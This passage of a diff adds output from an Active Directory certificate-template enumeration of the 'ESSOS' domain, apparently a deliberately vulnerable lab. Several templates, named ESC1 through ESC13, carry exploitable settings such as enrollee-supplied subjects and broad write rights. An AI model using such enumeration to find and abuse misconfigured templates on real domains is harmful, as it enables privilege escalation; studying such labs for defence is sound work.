+    Name Flags               : SubjectNameRequireDNS SubjectAlternativeNameRequireDNS
+    Enrollment Flags         : EnrollmentAutoEnrollment
+    Signatures Required      : 0
+    Extended Key Usages      :
+      Certificate Request Agent
+    Permissions              :
+      Owner                  : ESSOS\Enterprise Admins
+                              S-1-5-21-76206382-3835729989-2750497531-519
+      Access Rights         :
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 000F00FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 000F00FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : NT AUTHORITY\Authenticated Users (S-1-5-11)
+          Access mask       : 00020094
+
+[*] Listing info about the template 'ESC1'
+    Template Name            : ESC1
+    Template Friendly Name   : ESC1
+    Validity Period          : 1 years (31536000 seconds)
+    Renewal Period           : 42 days (3628800 seconds)
+    Name Flags               : SubjectNameEnrolleeSupplies
+    Enrollment Flags         :
+    Signatures Required      : 0
+    Extended Key Usages      :
+      Client Authentication
+    Permissions              :
+      Owner                  : ESSOS\Enterprise Admins
+                              S-1-5-21-76206382-3835729989-2750497531-519
+      Access Rights         :
+        Principal           : ESSOS\Domain Users (S-1-5-21-76206382-3835729989-2750497531-513)
+          Access mask       : 00000100
+          Flags             : 00000001
+                              Enrollment Rights
+        Principal           : ESSOS\Domain Users (S-1-5-21-76206382-3835729989-2750497531-513)
+          Access mask       : 00020094
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 000F01FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : NT AUTHORITY\Authenticated Users (S-1-5-11)
+          Access mask       : 00020094
+        Principal           : NT AUTHORITY\SYSTEM (S-1-5-18)
+          Access mask       : 000F01FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 000F01FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 000F01BD
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+
+[*] Listing info about the template 'ESC13'
+    Template Name            : ESC13
+    Template Friendly Name   : ESC13
+    Validity Period          : 1 years (31536000 seconds)
+    Renewal Period           : 42 days (3628800 seconds)
+    Name Flags               : SubjectAlternativeNameRequireUPN
+    Enrollment Flags         :
+    Signatures Required      : 0
+    Extended Key Usages      :
+      Client Authentication
+    Permissions              :
+      Owner                  : ESSOS\Enterprise Admins
+                              S-1-5-21-76206382-3835729989-2750497531-519
+      Access Rights         :
+        Principal           : ESSOS\Domain Users (S-1-5-21-76206382-3835729989-2750497531-513)
+          Access mask       : 00000100
+          Flags             : 00000001
+                              Enrollment Rights
+        Principal           : ESSOS\Domain Users (S-1-5-21-76206382-3835729989-2750497531-513)
+          Access mask       : 00020094
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 000F01FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : NT AUTHORITY\Authenticated Users (S-1-5-11)
+          Access mask       : 00020094
+        Principal           : NT AUTHORITY\SYSTEM (S-1-5-18)
+          Access mask
+  : 000F01FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 000F01FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 000F01BD
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+
+[*] Listing info about the template 'ESC2'
+    Template Name            : ESC2
+    Template Friendly Name   : ESC2
+    Validity Period          : 1 years (31536000 seconds)
+    Renewal Period           : 42 days (3628800 seconds)
+    Name Flags               : SubjectAlternativeNameRequireUPN
+    Enrollment Flags         : EnrollmentAutoEnrollment
+    Signatures Required      : 0
+    Extended Key Usages      :
+      Any Purpose
+    Permissions              :
+      Owner                  : ESSOS\Enterprise Admins
+                              S-1-5-21-76206382-3835729989-2750497531-519
+      Access Rights         :
+        Principal           : ESSOS\Domain Users (S-1-5-21-76206382-3835729989-2750497531-513)
+          Access mask       : 00000100
+          Flags             : 00000001
+                              Enrollment Rights
+        Principal           : ESSOS\Domain Users (S-1-5-21-76206382-3835729989-2750497531-513)
+          Access mask       : 00020094
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 000F01FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : NT AUTHORITY\Authenticated Users (S-1-5-11)
+          Access mask       : 00020094
+        Principal           : NT AUTHORITY\SYSTEM (S-1-5-18)
+          Access mask       : 000F01FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 000F01FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 000F01BD
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+
+[*] Listing info about the template 'ESC3'
+    Template Name            : ESC3
+    Template Friendly Name   : ESC3
+    Validity Period          : 1 years (31536000 seconds)
+    Renewal Period           : 42 days (3628800 seconds)
+    Name Flags               : SubjectAlternativeNameRequireUPN
+    Enrollment Flags         : EnrollmentAutoEnrollment
+    Signatures Required      : 1
+    Extended Key Usages      :
+      Client Authentication
+    Permissions              :
+      Owner                  : ESSOS\Enterprise Admins
+                              S-1-5-21-76206382-3835729989-2750497531-519
+      Access Rights         :
+        Principal           : ESSOS\Domain Users (S-1-5-21-76206382-3835729989-2750497531-513)
+          Access mask       : 00000100
+          Flags             : 00000001
+                              Enrollment Rights
+        Principal           : ESSOS\Domain Users (S-1-5-21-76206382-3835729989-2750497531-513)
+          Access mask       : 00020094
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 000F01FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : NT AUTHORITY\Authenticated Users (S-1-5-11)
+          Access mask       : 00020094
+        Principal           : NT AUTHORITY\SYSTEM (S-1-5-18)
+          Access mask       : 000F01FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 000F01FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 000F01BD
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+
+[*] Listing info about the template 'ESC3-CRA'
+    Template Name            : ESC3-CRA
+    Template Friendly Name   : ESC3-CRA
+    Validity Period          : 1 years (31536000 seconds)
+    Renewal Period           : 42 days (3628800 seconds)
+    Name Flags               : SubjectAlternativeNameRequireUPN
+    Enrollment Flags         : EnrollmentAutoEnrollment
+    Signatures Required      : 0
+    Extended Key Usages      :
+      Certificate Request Agent
+    Permissions              :
+      Owner                  : ESSOS\Enterprise Admins
+                              S-1-5-21-76206382-3835729989-2750497531-519
+      Access Rights         :
+        Principal           : ESSOS\Domain Users (S-1-5-21-76206382-3835729989-2750497531-513)
+          Access mask       : 00000100
+          Flags             : 00000001
+                              Enrollment Rights
+        Principal           : ESSOS\Domain Users (S-1-5-21-76206382-3835729989-2750497531-513)
+          Access mask       : 00020094
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 000F01FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : NT AUTHORITY\Authenticated Users (S-1-5-11)
+          Access mask       : 00020094
+        Principal           : NT AUTHORITY\SYSTEM (S-1-5-18)
+          Access mask       : 000F01FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 000F01FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 000F01BD
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+
+[*] Listing info about the template 'ESC4'
+    Template Name            : ESC4
+    Template Friendly Name   : ESC4
+    Validity Period          : 1 years (31536000 seconds)
+    Renewal Period           : 42 days (3628800 seconds)
+    Name Flags               : SubjectNameRequireDirectoryPath SubjectNameRequireEmail SubjectAlternativeNameRequireUPN
+    Enrollment Flags         : EnrollmentIncludeSymmetricAlgorithms EnrollmentPendAllRequests EnrollmentPublishToDS EnrollmentAutoEnrollment
+    Signatures Required      : 1
+    Extended Key Usages      :
+      Code Signing
+    Permissions              :
+      Owner                  : ESSOS\Enterprise Admins
+                              S-1-5-21-76206382-3835729989-2750497531-519
+      Access Rights         :
+        Principal           : ESSOS\Domain Users (S-1-
+5-21-76206382-3835729989-2750497531-513)
+          Access mask       : 00000100
+          Flags             : 00000001
+                              Enrollment Rights
+        Principal           : ESSOS\Domain Users (S-1-5-21-76206382-3835729989-2750497531-513)
+          Access mask       : 00020094
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 000F01FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : ESSOS\khal.drogo (S-1-5-21-76206382-3835729989-2750497531-1115)
+          Access mask       : 000F01FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : NT AUTHORITY\Authenticated Users (S-1-5-11)
+          Access mask       : 00020094
+        Principal           : NT AUTHORITY\SYSTEM (S-1-5-18)
+          Access mask       : 000F01FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 000F01FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 000F01BD
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+
+[*] Listing info about the template 'ESC9'
+    Template Name            : ESC9
+    Template Friendly Name   : ESC9
+    Validity Period          : 1 years (31536000 seconds)
+    Renewal Period           : 42 days (3628800 seconds)
+    Name Flags               : SubjectAlternativeNameRequireUPN
+    Enrollment Flags         : EnrollmentIncludeSymmetricAlgorithms EnrollmentPublishToDS EnrollmentAutoEnrollment
+    Signatures Required      : 0
+    Extended Key Usages      :
+      Client Authentication
+      Secure Email
+      Encrypting File System
+    Permissions              :
+      Owner                  : ESSOS\Enterprise Admins
+                              S-1-5-21-76206382-3835729989-2750497531-519
+      Access Rights         :
+        Principal           : ESSOS\Domain Users (S-1-5-21-76206382-3835729989-2750497531-513)
+          Access mask       : 00000100
+          Flags             : 00000001
+                              Enrollment Rights
+        Principal           : ESSOS\Domain Users (S-1-5-21-76206382-3835729989-2750497531-513)
+          Access mask       : 00020094
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 000F01FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : NT AUTHORITY\Authenticated Users (S-1-5-11)
+          Access mask       : 00020094
+        Principal           : NT AUTHORITY\SYSTEM (S-1-5-18)
+          Access mask       : 000F01FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 000F01FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 000F01BD
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+
+[*] Listing info about the template 'EnrollmentAgentOffline'
+    Template Name            : EnrollmentAgentOffline
+    Template Friendly Name   : Exchange Enrollment Agent (Offline request)
+    Validity Period          : 2 years (63072000 seconds)
+    Renewal Period           : 42 days (3628800 seconds)
+    Name Flags               : SubjectNameEnrolleeSupplies
+    Enrollment Flags         :
+    Signatures Required      : 0
+    Extended Key Usages      :
+      Certificate Request Agent
+    Permissions              :
+      Owner                  : ESSOS\Enterprise Admins
+                              S-1-5-21-76206382-3835729989-2750497531-519
+      Access Rights         :
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 000F00FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 000F00FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : NT AUTHORITY\Authenticated Users (S-1-5-11)
+          Access mask       : 00020094
+
+[*] Listing info about the template 'ExchangeUserSignature'
+    Template Name            : ExchangeUserSignature
+    Template Friendly Name   : Exchange Signature Only
+    Validity Period          : 1 years (31536000 seconds)
+    Renewal Period           : 42 days (3628800 seconds)
+    Name Flags               : SubjectNameEnrolleeSupplies
+    Enrollment Flags         :
+    Signatures Required      : 0
+    Extended Key Usages      :
+      Secure Email
+    Permissions              :
+      Owner                  : ESSOS\Enterprise Admins
+                              S-1-5-21-76206382-3835729989-2750497531-519
+      Access Rights         :
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 000F00FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 000F00FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : NT AUTHORITY\Authenticated Users (S-1-5-11)
+          Access mask       : 00020094
+
+[*] Listing info about the template 'ExchangeUser'
+    Template Name            : ExchangeUser
+  Template Friendly Name   : Exchange User
+    Validity Period          : 1 years (31536000 seconds)
+    Renewal Period           : 42 days (3628800 seconds)
+    Name Flags               : SubjectNameEnrolleeSupplies
+    Enrollment Flags         : EnrollmentIncludeSymmetricAlgorithms
+    Signatures Required      : 0
+    Extended Key Usages      :
+      Secure Email
+    Permissions              :
+      Owner                  : ESSOS\Enterprise Admins
+                              S-1-5-21-76206382-3835729989-2750497531-519
+      Access Rights         :
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 000F00FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 000F00FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : NT AUTHORITY\Authenticated Users (S-1-5-11)
+          Access mask       : 00020094
+
+[*] Listing info about the template 'IPSECIntermediateOnline'
+    Template Name            : IPSECIntermediateOnline
+    Template Friendly Name   : IPSec
+    Validity Period          : 2 years (63072000 seconds)
+    Renewal Period           : 42 days (3628800 seconds)
+    Name Flags               : SubjectNameRequireDNS SubjectAlternativeNameRequireDNS
+    Enrollment Flags         : EnrollmentAutoEnrollment
+    Signatures Required      : 0
+    Extended Key Usages      :
+      IP security IKE intermediate
+    Permissions              :
+      Owner                  : ESSOS\Enterprise Admins
+                              S-1-5-21-76206382-3835729989-2750497531-519
+      Access Rights         :
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Domain Computers (S-1-5-21-76206382-3835729989-2750497531-515)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Domain Controllers (S-1-5-21-76206382-3835729989-2750497531-516)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 000F00FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 000F00FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : NT AUTHORITY\Authenticated Users (S-1-5-11)
+          Access mask       : 00020094
+
+[*] Listing info about the template 'IPSECIntermediateOffline'
+    Template Name            : IPSECIntermediateOffline
+    Template Friendly Name   : IPSec (Offline request)
+    Validity Period          : 2 years (63072000 seconds)
+    Renewal Period           : 42 days (3628800 seconds)
+    Name Flags               : SubjectNameEnrolleeSupplies
+    Enrollment Flags         :
+    Signatures Required      : 0
+    Extended Key Usages      :
+      IP security IKE intermediate
+    Permissions              :
+      Owner                  : ESSOS\Enterprise Admins
+                              S-1-5-21-76206382-3835729989-2750497531-519
+      Access Rights         :
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 000F00FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 000F00FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : NT AUTHORITY\Authenticated Users (S-1-5-11)
+          Access mask       : 00020094
+
+[*] Listing info about the template 'KerberosAuthentication'
+    Template Name            : KerberosAuthentication
+    Template Friendly Name   : Kerberos Authentication
+    Validity Period          : 1 years (31536000 seconds)
+    Renewal Period           : 42 days (3628800 seconds)
+    Name Flags               : SubjectAlternativeNameRequireDNS SubjectAlternativeNameRequireDomainDNS
+    Enrollment Flags         : EnrollmentAutoEnrollment
+    Signatures Required      : 0
+    Extended Key Usages      :
+      Client Authentication
+      Server Authentication
+      Smart Card Logon
+      KDC Authentication
+    Permissions              :
+      Owner                  : ESSOS\Enterprise Admins
+                              S-1-5-21-76206382-3835729989-2750497531-519
+      Access Rights         :
+        Principal           : ESSOS\Enterprise Read-only Domain Controllers (S-1-5-21-76206382-3835729989-2750497531-498)
+          Access mask       : 00000110
+          Flags             : 00000001
+                              Enrollment Rights
+        Principal           : ESSOS\Enterprise Read-only Domain Controllers (S-1-5-21-76206382-3835729989-2750497531-498)
+          Access mask       : 00000110
+          Flags             : 00000001
+                              Enrollment Rights
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Domain Contro
+llers (S-1-5-21-76206382-3835729989-2750497531-516)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Domain Controllers (S-1-5-21-76206382-3835729989-2750497531-516)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {A05B8CC2-17BC-4802-A710-E7C15AB866A2}
+        Principal           : NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS (S-1-5-9)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS (S-1-5-9)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {A05B8CC2-17BC-4802-A710-E7C15AB866A2}
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 000F00FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 000F00FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : NT AUTHORITY\Authenticated Users (S-1-5-11)
+          Access mask       : 00020094
+
+[*] Listing info about the template 'KeyRecoveryAgent'
+    Template Name            : KeyRecoveryAgent
+    Template Friendly Name   : Key Recovery Agent
+    Validity Period          : 2 years (63072000 seconds)
+    Renewal Period           : 42 days (3628800 seconds)
+    Name Flags               : SubjectNameRequireDirectoryPath SubjectAlternativeNameRequireUPN
+    Enrollment Flags         : EnrollmentIncludeSymmetricAlgorithms EnrollmentPendAllRequests EnrollmentPublishToKRAContainer EnrollmentAutoEnrollment
+    Signatures Required      : 0
+    Extended Key Usages      :
+      Key Recovery Agent
+    Permissions              :
+      Owner                  : ESSOS\Enterprise Admins
+                              S-1-5-21-76206382-3835729989-2750497531-519
+      Access Rights         :
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 000F00FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 000F00FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : NT AUTHORITY\Authenticated Users (S-1-5-11)
+          Access mask       : 00020094
+
+[*] Listing info about the template 'OCSPResponseSigning'
+    Template Name            : OCSPResponseSigning
+    Template Friendly Name   : OCSP Response Signing
+    Validity Period          : 0 years (1209600 seconds)
+    Renewal Period           : 2 days (172800 seconds)
+    Name Flags               : SubjectNameRequireDNS SubjectAlternativeNameRequireDNS
+    Enrollment Flags         : EnrollmentAddOCSPNoCheck EnrollmentNoRevocationInfoInCerts
+    Signatures Required      : 0
+    Extended Key Usages      :
+      OCSP Signing
+    Permissions              :
+      Owner                  : ESSOS\Enterprise Admins
+                              S-1-5-21-76206382-3835729989-2750497531-519
+      Access Rights         :
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 000F00FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 000F00FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : NT AUTHORITY\Authenticated Users (S-1-5-11)
+          Access mask       : 00020094
+
+[*] Listing info about the template 'RASAndIASServer'
+    Template Name            : RASAndIASServer
+    Template Friendly Name   : RAS and IAS Server
+    Validity Period          : 1 years (31536000 seconds)
+    Renewal Period           : 42 days (3628800 seconds)
+    Name Flags               : SubjectNameRequireCommonName SubjectAlternativeNameRequireDNS
+    Enrollment Flags         : EnrollmentAutoEnrollment
+    Signatures Required      : 0
+    Extended Key Usages      :
+      Client Authentication
+      Server Authentication
+    Permissions              :
+      Owner                  : ESSOS\Enterprise Admins
+                              S-1-5-21-76206382-3835729989-2750497531-519
+      Access Rights         :
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\RAS and IAS Servers (S-1-5-21-76206382-3835729989-2750497531-553)
+          Access mask       : 00000130
+          Flags             : 00000001
+                              Enrollment Rights
+                              WriteProperty Rights on {0E10C968-78FB-11D2-90D4-00C04F79DC55}
+        Principal           : ESSOS\Domain Admins (S-1-5-21-76206382-3835729989-2750497531-512)
+          Access mask       : 000F00FF
+                WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : ESSOS\Enterprise Admins (S-1-5-21-76206382-3835729989-2750497531-519)
+          Access mask       : 000F00FF
+                              WriteOwner Rights
+                              WriteDacl Rights
+                              WriteProperty All Rights
+        Principal           : NT AUTHORITY\Authenticated Users (S-1-5-11)
+          Access mask       : 00020094
+
+[*] Listing info about the template 'CA'
+    Template Name            : CA
+    Template Friendly Name   : Root Certification Authority
+    Validity Period          : 5 years (157680000 seconds)
+    Renewal Period           : 42 days (3628800 seconds)
